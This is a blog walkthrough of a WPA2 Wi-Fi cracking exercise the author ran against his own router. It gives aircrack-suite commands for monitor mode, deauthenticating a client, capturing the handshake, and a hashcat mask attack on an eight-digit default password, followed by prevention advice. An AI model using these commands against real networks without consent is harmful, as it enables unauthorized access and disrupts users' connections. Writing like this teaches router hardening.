---
title: "Wi-Fi Hacking"
date: 03-11-2025
categories: [Guides]
tags: [Password Cracking, WPA2, WireShark, Wi-Fi]
image: /assets/images/WPA2/icon.png
---

Some time ago, I decided to swap ISPs. When I received my new router, I noticed several weak points in its default configurations. Mainly, the SSID of the router was left unchanged. This gave me the manufacturer and the model of the router. I also noticed that the password was extremely insecure; it used an eight-character long number-only password. I logged into the router's webpage portal and saw that it was also using WPA2. I could not resist the urge to do a simulated pentest against my own Wi-Fi network.

For this, I used a wireless adapter. I did not need anything fancy, just something that supported monitor mode and was compatible with Linux. I ended up using this one, which was just 13 euros on Amazon: [TP-Link AC600 Wireless Dual Band USB Adapter for PC](https://www.amazon.es/-/en/Wireless-Supports-10-7-10-13-Archer-T2U/dp/B00K11UIV4?pd_rd_w=WlItl&content-id=amzn1.sym.9f9111e3-7075-4ebb-9378-2ea5f442db43%3Aamzn1.symc.30e3dbb4-8dd8-4bad-b7a1-a45bcdbc49b8&pf_rd_p=9f9111e3-7075-4ebb-9378-2ea5f442db43&pf_rd_r=QZD2XFF6YSQVGN8T1HPE&pd_rd_wg=wZtCp&pd_rd_r=b1160683-0959-49bd-8b4f-1c8a9dd08917&pd_rd_i=B00K11UIV4&th=1). I attempted the pentest on my Parrot OS VM, but some commands would not work as intended; therefore, I used a Kali VM. On a side note, for the sake of privacy, I swapped all the MAC addresses and SSIDs, but the actual attack I will be describing did happen. Remember to not perform any type of attack to any party that has not agreed beforehand to it. 

## Setup
To set up the attack, I simply connected the USB adapter into my main Windows 11 machine. I did not need any additional drivers or anything of the sort. To make sure my Kali VM is using the USB adapter, I went into the Kali's Oracle VM's settings page and enabled the following:

![vm.png](/assets/images/WPA2/VM.png)

If we now start the Kali VM and use the `iwconfig` command, we will see that our USB adapter has been recognized and has its own interface. We needed this USB adapter because our own WAN card cannot get passed to the VM; if you have a dual boot configuration, I believe you do not need the adapter.
```
iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

!!wlan0!!     IEEE 802.11  ESSID:off/any  
          !!Mode:Managed!!  Access Point: Not-Associated   Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```

We can see that the mode is set to `Managed` but we need it to be set to `Monitor`. Before this, lets get rid of all the processes that could conflict with our attack with the following command:
```bash
sudo airmon-ng check kill                                                  

Killing these processes:

    PID Name
   1448 wpa_supplicant
```

We can now enable Monitor mode:
```
sudo airmon-ng start wlan0


PHY     Interface       Driver          Chipset

phy0    wlan0           rtw88_8821au    TP-Link 802.11ac WLAN Adapter 
                !!(monitor mode enabled)!!
```

We can also confirm its enabled by again checking the wireless interfaces, and it now shows that the mode is set to `Monitor`.
```
iwconfig
lo        no wireless extensions.

eth0      no wireless extensions.

wlan0     IEEE 802.11  !!Mode:Monitor!!  Frequency:2.412 GHz  Tx-Power=20 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
```
## Walkthrough
We can now start monitoring networks around us
```
sudo airodump-ng  wlan0

 CH 13 ][ Elapsed: 0 s ][ 2025-11-03 15:05 ][ WPA handshake: <REDACTED>                                                                             
                                                                                                                                                             
  BSSID              PWR  Beacons    #Data, #/s   CH   MB   ENC CIPHER  AUTH   ESSID                                                                             
                                                                                                                                                             
 <SNIP>                                                                   
 !!1C:3B:A3:C0:71:4C!!  -44        5        0    0   !!1!!  270   WPA2 CCMP   PSK  !!TP-Link_314D!!
 <SNIP>                                                                 
                                                                                                                                                             
```

You will see a lot of devices and routers; I removed the visual clutter so we can focus on the intended target `TP-Link_314D`. This is an interesting SSID for one reason: it is using the default name of the manufacturer. Since this is my router, I already know that it uses a string of eight numbers as the password, but let's imagine I did not know this. With a quick Google search of the SSID, I find the following image titled `TP-Link Router AC1200 C50 Configuration`:

![router](/assets/images/WPA2/router.webp)

You can see that the router in the image also has a string of eight numbers as the password. If I see a router with the same or similar SSID, I would suspect it also has the factory password format. Our next objective is to capture the 4-way handshake of an authenticating client, which will contain enough information to derive the router's hashed password. To do this, let's use the MAC address of the target and save the captured packets to a file. Also, remember to specify the channel; you can see that in the `CH` column from the `airodump-ng wlan0` command.

```
sudo airodump-ng -c 1 --bssid 1C:3B:A3:C0:71:4C -w capture  wlan0

15:06:17  Created capture file "capture-01.cap".

 CH  1 ][ Elapsed: 0 s ][ 2025-11-03 15:06                                                             
                                                                                                       
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                   
                                                                                                       
 1C:3B:A3:C0:71:4C  -39  93       31        0    0   1  270   WPA2 CCMP   PSK  TP-Link_314D            
                                                                                                       
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                     
                                                                                                       
 1C:3B:A3:C0:71:4C  !!F8:35:52:17:AA:2D!!  -53    0 - 1      0        1                                    
Quitting... 
```

Nothing really happened, we captured some packets but no 4-way handshake. This occurred because no clients were actively authenticating to the router since they were already connected. To overcome this obstacle, we can manually deauthenticate a client. In this case, my phone (Highlighted in the code snippet above with MAC address `F8:35:52:17:AA:2D`) was the only connected device on that router, which explains why it's the only device shown below the router information.

We can leave the above command running in the background to listen for authentications, in another terminal use the following command to deauthenticate the client. This will prompt it to automatically authenticate again.

```
sudo aireplay-ng --deauth 1 -a 1C:3B:A3:C0:71:4C -c F8:35:52:17:AA:2D wlan0
15:07:18 Waiting for beacon frame (BSSID: 1C:3B:A3:C0:71:4C) on channel 1
15:07:18 Sending 64 directed DeAuth (code 7). STMAC: [F8:35:52:17:AA:2D] [ 0| 0 ACKs]
```

The above command just sent a DeAuth ping to the client (my phone) and disconnected it from the Wi-Fi network. This can done to any client without knowing the actual password. If we take a look at the receiver we can see that the handshake has been captured. This took around 3 minutes to work. 
```
sudo airodump-ng -c 1 --bssid 1C:3B:A3:C0:71:4C -w capture  wlan0
15:17:01  Created capture file "capture-03.cap".


 CH  1 ][ Elapsed: 48 s ][ 2025-11-03 15:17 ][ !!WPA handshake: 1C:3B:A3:C0:71:4C!!                                                                              
                                                                                                                                                             
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                                                                         
                                                                                                                                                             
 1C:3B:A3:C0:71:4C  -43  83      387       27    0   1  270   WPA2 CCMP   PSK  TP-Link_314D                                                                  
                                                                                                                                                             
 BSSID              STATION            PWR    Rate    Lost   Frames  Notes  Probes                                                                           
                                                                                                                                                             
 1C:3B:A3:C0:71:4C  F8:35:52:17:AA:2D  -55    1e- 1e    54      255  EAPOL                                                                                   
Quitting... 
```

From a victim's perspective, their phone, tablet, or smart TV just lost connection for a couple of seconds, and they would never suspect a thing. We could also disconnect every client that is connected to the router but this is too noisy. With the four-way handshake completed, we can use `aircrack-ng` to crack it, but I think this tool only works with wordlists. Since I know that the password is an eight-digit string, I would like to use `Hashcat` because I am more familiar with it and can easily do this type of brute-force attack. To capture the hash, I used the `hcxpcapngtool`.

```
hcxpcapngtool -o hash.hc22000 capture-01.cap
hcxpcapngtool 6.3.5 reading from capture-03.cap...

<SNIP>
session summary
---------------
processed cap files...................: 1
```
```                                                                                                                                                             
cat hash.hc22000 
WPA*02*a9f72[REDACTED_HASH]                                                                                                                                        
```

I then used `hashcat` with a mask attack to crack the password hash.
```
hashcat -a 3 -m 22000 hash.hc22000 ?d?d?d?d?d?d?d?d

!![REDACTED_HASH]:28409427!!

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash.hc22000
Time.Started.....: Mon Nov 03 15:22:43 2025 (2 mins, 30 secs)
Time.Estimated...: Mon Nov 03 15:25:13 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: ?d?d?d?d?d?d?d?d [8]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   399.9 kH/s (8.01ms) @ Accel:8 Loops:256 Thr:256 Vec:1
Speed.#2.........:   152.1 kH/s (9.78ms) @ Accel:32 Loops:128 Thr:256 Vec:1
Speed.#*.........:   552.0 kH/s
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 82575360/100000000 (82.58%)
Rejected.........: 0/82575360 (0.00%)
Restore.Point....: 8110080/10000000 (81.10%)
Restore.Sub.#1...: Salt:0 Amplifier:7-8 Iteration:0-1
Restore.Sub.#2...: Salt:0 Amplifier:2-3 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: 80727784 -> 85467216
Candidates.#2....: 24367216 -> 23744516
Hardware.Mon.#1..: Temp: 84c Util: 98% Core:2235MHz Mem:8000MHz Bus:8
Hardware.Mon.#2..: Temp:  0c Fan:  0% Util: 95% Core: 800MHz Mem:2800MHz Bus:16

Started: Mon Nov 03 15:22:31 2025
Stopped: Mon Nov 03 15:25:15 2025
```

I used a GPU so it only took about 3 minutes to go through every possible combination of eight digits. Putting the password inside a file and passing it to `aircrack-ng` shows that it was the correct password, and that's about it. To add insult to injury the router's web portal credentials were admin:admin ...

```
aircrack-ng capture-01.cap -w pass.txt -e TP-Link_314D -b 1C:3B:A3:C0:71:4C 
Reading packets, please wait...
Opening capture-01.cap
Read 571 packets.

1 potential targets

                               Aircrack-ng 1.7 

      [00:00:00] 1/1 keys tested (113.62 k/s) 

      Time left: --

                           !!KEY FOUND! [ 28409427 ]!!


      Master Key     : 67 45 87 86 B0 D9 D4 0B 96 C6 1B 21 6E A0 8A 00 
                       11 84 9E 22 35 88 4F B5 3D D6 37 FE BF BD 47 0E 

      Transient Key  : AB 9F CD DF 5D 91 90 52 22 F2 37 BF B6 A2 B5 0A 
                       37 74 96 55 2C 13 74 5A 7D C3 E4 5F 31 5D 23 1D 
                       36 60 E1 93 65 D3 E8 AB 03 71 FE BD 9B B7 A0 51 
                       DD 41 6B EC 65 A9 68 57 60 13 55 29 45 2D B3 EE 

      EAPOL HMAC     : A9 F7 2C 05 4A AE A3 73 E6 28 56 BC 0E D4 8E 42 
```

Following this I changed the router's password to a more secure value.

## How to Prevent This Attack

If your router's password is less than 12 characters or has very little complexity, change it immediately to a long and complex password. Even if an attacker is able to obtain the handshake, they will not be able to crack the password.

If your router still has the factory SSID and leaks the manufacturer or model, change it to a different name. You can put anything, really; just make sure it's different.

Most routers come with WPA2 as the default. This protocol is fine but still vulnerable to these kinds of attacks. WPA3, on the other hand, uses a different protocol and is considered more secure. You may be asking why ISPs use WPA2; well, I do not really know, but if I had to take a guess, it is because it is cheaper, or there are old devices that cannot handle WPA3 yet.